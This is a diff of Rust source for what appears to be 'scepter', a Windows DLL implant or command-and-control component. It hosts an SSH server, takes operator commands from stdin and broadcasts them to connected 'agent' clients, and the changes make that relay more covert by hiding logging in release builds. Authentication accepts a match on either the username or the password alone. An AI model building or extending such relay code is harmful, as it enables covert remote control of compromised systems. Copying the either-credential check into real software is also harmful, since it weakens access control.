@@ -1,15 +1,18 @@
 #![no_main]
 #![allow(dead_code)]
+#![feature(stmt_expr_attributes)]
 
 use std::collections::HashMap;
 use std::os::raw::c_void;
 use windows_sys::Win32::Foundation::{BOOL, HANDLE};
 
 use std::sync::Arc;
-
+use std::thread;
+use debug_print::{debug_eprintln, debug_println};
 use rand_core::OsRng;
 use russh::server::{Msg, Server as _, Session};
 use russh::*;
+use tokio::runtime::Runtime;
 use tokio::sync::Mutex;
 
 pub use scepter_common::*;
@@ -29,14 +32,32 @@ pub async fn dll_main() {
         ..Default::default()
     };
     let config = Arc::new(config);
-    let mut sh = Server {
+    let sh = Server {
         clients: Arc::new(Mutex::new(HashMap::new())),
         id: 0,
     };
 
     let interface_ip = String::from_utf8_lossy(SSH_INTERFACE_IPV4_ADDRESS).to_string().trim_matches(char::from(0)).to_string();
+    // Clone sh if needed (if it's a type that implements Clone)
+    let mut sh_clone = sh.clone();
 
-    sh.run_on_address(config, (interface_ip, 2222)).await.unwrap();
+    // Create a new thread with its own tokio runtime
+    thread::spawn(move || {
+        // Create a new tokio runtime for this thread
+        let rt = Runtime::new().unwrap();
+
+        // Clone the object if needed
+        let mut sh_clone = sh.clone();
+
+        // Execute the async function on this thread's runtime
+        rt.block_on(async {
+            sh_clone.command_loop().await;
+        });
+    });
+
+    let interface_port = str::from_utf8(SSH_PORT).unwrap().trim_matches(char::from(0)).parse::<u16>().unwrap();
+
+    sh_clone.run_on_address(config, (interface_ip, interface_port)).await.unwrap();
 }
 
 #[derive(Clone)]
@@ -48,27 +69,47 @@ struct Server {
 impl Server {
     pub async fn post(&mut self, data: CryptoVec) {
         let mut clients = self.clients.lock().await;
-        println!("Broadcasting to {} clients", clients.len());
+        debug_println!("Broadcasting to {} clients", clients.len());
         for (id, (channel, s)) in clients.iter_mut() {
-            println!("Sending to client {}", id);
+            debug_println!("Sending to client {}", id);
             match s.data(*channel, data.clone()).await {
-                Ok(_) => println!("Successfully sent to client {}", id),
-                Err(e) => println!("Failed to send to client {}: {:?}", id, e),
+                Ok(_) => debug_println!("Successfully sent to client {}", id),
+                Err(e) => debug_println!("Failed to send to client {}: {:?}", id, e),
             }
         }
     }
 
-    
+    #[cfg(not(debug_assertions))]
+    /// TODO Reads from input pipe and sends that shit to the agent
+    pub async fn command_loop(&mut self) {
+        let mut input = String::new();
+
+        match std::io::stdin().read_line(&mut input) {
+            Ok(_) => debug_println!("You typed: {}", input.trim()),
+            Err(err) => debug_eprintln!("Error reading line: {}", err),
+        }
+        let input = input.trim_matches(char::from(0));
+        self.post(CryptoVec::from(input)).await;
+    }
+
+    #[cfg(debug_assertions)]
+    /// Lets you run (1) test command to validate execution from agent
     pub async fn command_loop(&mut self) {
         loop {
             let mut input = String::new();
 
             match std::io::stdin().read_line(&mut input) {
-                Ok(_) => println!("You typed: {}", input.trim()),
-                Err(err) => eprintln!("Error reading line: {}", err),
+                Ok(_) => debug_println!("You typed: {}", input.trim()),
+                Err(err) => debug_eprintln!("Error reading line: {}", err),
             }
             let input = input.trim_matches(char::from(0));
-            self.post(CryptoVec::from(input)).await;
+            if input.eq("exit") {
+                std::process::exit(0);
+            }
+            if input.starts_with("cmd:"){
+                let input = input.replace("cmd:","");
+                self.post(CryptoVec::from(input)).await;
+            }
         }
     }
 }
@@ -81,11 +122,11 @@ impl server::Server for Server {
 
         let mut s = self.clone();
         s.id = id; // Set this handler's ID
-        println!("New client connection with ID: {}", id);
+        debug_println!("New client connection with ID: {}", id);
         s
     }
     fn handle_session_error(&mut self, _error: <Self::Handler as russh::server::Handler>::Error) {
-        eprintln!("Session error: {:#?}", _error);
+        debug_eprintln!("Session error: {:#?}", _error);
     }
 }
 
@@ -102,13 +143,6 @@ impl server::Handler for Server {
         let input_password = String::from_utf8_lossy(pass.as_bytes()).to_string().trim_matches(char::from(0)).to_string();
 
         if input_username.eq(&username) || input_password.eq(&password) {
-            let mut self_clone = self.clone();
-
-            // Spawn the command loop
-            tokio::spawn(async move {
-                self_clone.command_loop().await;
-            });
-
             return Ok(server::Auth::Accept);
         }
 
@@ -120,15 +154,15 @@ impl server::Handler for Server {
         channel: Channel<Msg>,
         session: &mut Session,
     ) -> Result<bool, Self::Error> {
-        println!("Client {} opened a session channel with ID: {}", self.id, channel.id());
+        debug_println!("Client {} opened a session channel with ID: {}", self.id, channel.id());
 
         // Store client in the HashMap
         let mut clients = self.clients.lock().await;
         clients.insert(self.id, (channel.id(), session.handle()));
 
-        println!("Client registered. Total clients: {}", clients.len());
+        debug_println!("Client registered. Total clients: {}", clients.len());
         for (id, _) in clients.iter() {
-            println!("  Client ID: {}", id);
+            debug_println!("  Client ID: {}", id);
         }
 
         // Send initial welcome message
@@ -149,9 +183,12 @@ impl server::Handler for Server {
             return Err(russh::Error::Disconnect);
         }
 
-        let data = CryptoVec::from(format!("Got data: {}\r\n", String::from_utf8_lossy(data)));
-        self.post(data.clone()).await;
-        session.data(channel, data)?;
+        debug_println!("Got data: {}", String::from_utf8_lossy(data));
+
+        let _data = CryptoVec::from(format!("Got data: {}\r\n", String::from_utf8_lossy(data)));
+        // self.post(data.clone()).await;
+        // session.data(channel, data)?;
+
         Ok(())
     }
 }
